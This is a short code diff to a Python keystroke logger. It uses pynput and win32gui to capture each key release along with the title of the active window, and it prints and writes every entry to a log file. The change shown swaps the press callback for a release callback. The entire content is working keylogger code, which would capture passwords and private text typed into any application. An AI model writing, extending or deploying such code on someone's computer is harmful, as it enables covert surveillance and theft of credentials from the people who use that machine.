@@ -11,12 +11,12 @@ logging.basicConfig(
     format = '%(asctime)s  %(message)s'
 )
   
-def on_press(key):
+def on_release(key):
     w = win32gui
     current_window = w.GetWindowText (w.GetForegroundWindow())
     msg = str(key).ljust(18) + " \t " + str(current_window)
     print(msg)
     logging.info(msg)
 
-with Listener(on_press = on_press) as listener:
+with Listener(on_release = on_release) as listener:
     listener.join()
